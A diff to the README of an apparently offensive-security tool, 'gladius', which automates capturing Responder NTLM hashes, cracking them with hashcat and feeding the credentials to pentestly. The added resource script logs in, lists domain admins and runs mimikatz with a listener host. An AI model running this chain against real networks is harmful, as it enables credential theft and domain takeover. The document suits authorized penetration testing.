@@ -3,7 +3,7 @@
 ### Install
 ```
 pip install watchdog
-git clone https://git.praetorianlabs.com/thebarbershopper/gladius/blob/master/gladius.py
+git clone https://git.praetorianlabs.com/thebarbershopper/gladius
 ```
 
 ### Configuration
@@ -40,34 +40,19 @@ optional arguments:
 
 ![exmaple.png](example.png)
 
-Check the file in `Creds outfile_path` from the config for your reward.
-
 ### Example module
 
 ```
 class CredsHandler(GladiusHandler):
-    """
-    Watch for new hash files and run hashcat against them
-    """
+
     patterns = ['*']
 
     def process(self, event):
         with open(event.src_path, 'r') as f:
             data = f.read().split('\n')
 
-        outfile = self.get_outfile()
-
-        for line in data:
-            line = line.split(':')
-            try:
-                cred = '{} {} {}'.format(line[2], line[0], line[-1])
-                success("New creds: {}".format(cred))
-                outfile.write(cred + '\n')
-            except IndexError:
-                pass
+        # Perform work on data
 ```
-
-Just need a `process` function to handle the new data.
 
 
 Add yourself to the handlers list
@@ -76,3 +61,50 @@ handlers = [(ResponderHandler, config.get('Responder', 'watch_path')),
             (CredsHandler, ResponderHandler().outpath),
             (PentestlyHandler, CredsHandler().outpath)]
 ```
+
+### Workings
+
+#### Responder
+
+Watches responder log for `*NTLM*txt` files. For each file found, parses output, creates a temp file containing the new hashes, and passes this to hashcat with the correct hash type
+
+#### Credentials
+
+Watches for output from `hashcat` and exports files with the following format:
+
+```
+Domain Username Password
+```
+
+#### Pentestly
+
+Watches for sanitized hashcat output and passes credentials to `pentestly` via the following resource script.
+
+```
+workspaces add gladius
+load nmap
+set filename /tmp/gladius.xml
+run
+
+load login
+set domain DOMAIN
+set username USERNAME
+set password PASSWORD
+run
+
+load get_domain_admin_names
+run
+
+load mimikatz
+set lhost LHOST
+run
+
+load reporting/csv
+set filename OUTFILE
+set table pentestly_creds
+run
+```
+
+#### Admin
+
+Watches for output from Pentestly and parses the found credentials for `Local Admin` and new credentials from `Mimikatz`
